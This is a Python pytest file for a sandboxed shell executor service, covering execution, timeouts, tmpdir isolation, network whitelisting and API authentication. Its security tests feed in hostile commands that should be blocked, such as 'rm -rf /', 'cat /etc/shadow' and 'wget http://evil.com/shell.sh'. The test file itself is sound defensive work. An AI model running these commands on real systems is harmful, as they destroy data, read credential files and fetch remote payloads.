"""Tests for sandbox executor"""

import pytest

from app.executor import execute


class TestExecute:
    @pytest.mark.asyncio
    async def test_simple_echo(self):
        result = await execute("echo hello world")
        assert result.exit_code == 0
        assert "hello world" in result.stdout
        assert result.duration_ms > 0

    @pytest.mark.asyncio
    async def test_stderr_output(self):
        result = await execute("echo error >&2")
        assert "error" in result.stderr

    @pytest.mark.asyncio
    async def test_nonzero_exit_code(self):
        result = await execute("exit 42")
        assert result.exit_code == 42

    @pytest.mark.asyncio
    async def test_timeout(self):
        result = await execute("sleep 10", timeout=1)
        assert result.exit_code == 124
        assert "timed out" in result.stderr

    @pytest.mark.asyncio
    async def test_python_execution(self):
        result = await execute('python3 -c "print(2 + 3)"')
        assert result.exit_code == 0
        assert "5" in result.stdout

    @pytest.mark.asyncio
    async def test_env_vars(self):
        result = await execute("echo $MY_VAR", envs={"MY_VAR": "test_value"})
        assert "test_value" in result.stdout

    @pytest.mark.asyncio
    async def test_tmpdir_isolation(self):
        """每次执行的工作目录不同"""
        result1 = await execute("pwd")
        result2 = await execute("pwd")
        # 两次执行的 tmpdir 路径不同
        assert result1.stdout.strip() != result2.stdout.strip()

    @pytest.mark.asyncio
    async def test_empty_command(self):
        result = await execute("")
        # 空命令也能正常返回
        assert result.exit_code == 0

    @pytest.mark.asyncio
    async def test_multiline_output(self):
        result = await execute("echo line1; echo line2; echo line3")
        assert result.exit_code == 0
        lines = result.stdout.strip().split("\n")
        assert len(lines) == 3


class TestSecurity:
    """命令黑名单安全测试"""

    @pytest.mark.asyncio
    async def test_block_sudo(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("sudo rm -rf /")

    @pytest.mark.asyncio
    async def test_block_curl(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("curl http://evil.com")

    @pytest.mark.asyncio
    async def test_block_wget(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("wget http://evil.com/shell.sh")

    @pytest.mark.asyncio
    async def test_block_cat_shadow(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("cat /etc/shadow")

    @pytest.mark.asyncio
    async def test_block_pip_install(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("pip install malware")

    @pytest.mark.asyncio
    async def test_block_rm_root(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("rm -rf /")

    @pytest.mark.asyncio
    async def test_block_chmod(self):
        with pytest.raises(ValueError, match="受限操作"):
            await execute("chmod 777 /etc/passwd")

    @pytest.mark.asyncio
    async def test_allow_normal_python(self):
        """正常 Python 代码不应被拦截"""
        result = await execute('python3 -c "print(42)"')
        assert result.exit_code == 0
        assert "42" in result.stdout

    @pytest.mark.asyncio
    async def test_allow_echo(self):
        """正常 echo 不应被拦截"""
        result = await execute("echo hello")
        assert result.exit_code == 0


class TestNetworkWhitelist:
    """网络命令白名单测试"""

    @pytest.mark.asyncio
    async def test_whitelist_allows_curl(self, monkeypatch):
        """ALLOWED_NETWORK_COMMANDS=curl 时，curl 不被拦截"""
        monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "curl")
        # 重建黑名单
        import app.executor as ex
        ex._BLOCKED_RE = ex._build_blocked_patterns()
        try:
            # curl 不存在也没关系，关键是不被 _validate_command 拦截
            result = await execute("curl --version")
            # 只要不抛 ValueError 就算通过
            assert result.exit_code is not None
        finally:
            monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "")
            ex._BLOCKED_RE = ex._build_blocked_patterns()

    @pytest.mark.asyncio
    async def test_whitelist_still_blocks_others(self, monkeypatch):
        """ALLOWED_NETWORK_COMMANDS=curl 时，wget 仍被拦截"""
        monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "curl")
        import app.executor as ex
        ex._BLOCKED_RE = ex._build_blocked_patterns()
        try:
            with pytest.raises(ValueError, match="受限操作"):
                await execute("wget http://example.com")
        finally:
            monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "")
            ex._BLOCKED_RE = ex._build_blocked_patterns()

    @pytest.mark.asyncio
    async def test_wildcard_allows_all_network(self, monkeypatch):
        """ALLOWED_NETWORK_COMMANDS=* 时，所有网络命令放行"""
        monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "*")
        import app.executor as ex
        ex._BLOCKED_RE = ex._build_blocked_patterns()
        try:
            # curl 和 wget 都不被拦截
            result = await execute("curl --version")
            assert result.exit_code is not None
            result = await execute("wget --version")
            assert result.exit_code is not None
        finally:
            monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "")
            ex._BLOCKED_RE = ex._build_blocked_patterns()

    @pytest.mark.asyncio
    async def test_whitelist_does_not_affect_non_network_blocks(self, monkeypatch):
        """即使网络全放行，sudo 等仍被拦截"""
        monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "*")
        import app.executor as ex
        ex._BLOCKED_RE = ex._build_blocked_patterns()
        try:
            with pytest.raises(ValueError, match="受限操作"):
                await execute("sudo rm -rf /")
        finally:
            monkeypatch.setattr("app.executor.ALLOWED_NETWORK_COMMANDS", "")
            ex._BLOCKED_RE = ex._build_blocked_patterns()


class TestExecuteAPI:
    """测试 FastAPI 端点"""

    @pytest.fixture
    def client(self):
        from fastapi.testclient import TestClient

        from app.main import app

        return TestClient(app)

    def test_exec_endpoint(self, client):
        resp = client.post("/exec", json={"command": "echo api_test"})
        assert resp.status_code == 200
        data = resp.json()
        assert data["exit_code"] == 0
        assert "api_test" in data["stdout"]

    def test_exec_missing_command(self, client):
        resp = client.post("/exec", json={"command": ""})
        assert resp.status_code == 400

    def test_health(self, client):
        resp = client.get("/health")
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"

    def test_auth_required(self, client, monkeypatch):
        monkeypatch.setattr("app.main.INNER_HTTP_SECRET", "secret123")
        resp = client.post("/exec", json={"command": "echo test"})
        assert resp.status_code == 403

    def test_auth_valid(self, client, monkeypatch):
        monkeypatch.setattr("app.main.INNER_HTTP_SECRET", "secret123")
        resp = client.post(
            "/exec",
            json={"command": "echo test"},
            headers={"Authorization": "Bearer secret123"},
        )
        assert resp.status_code == 200
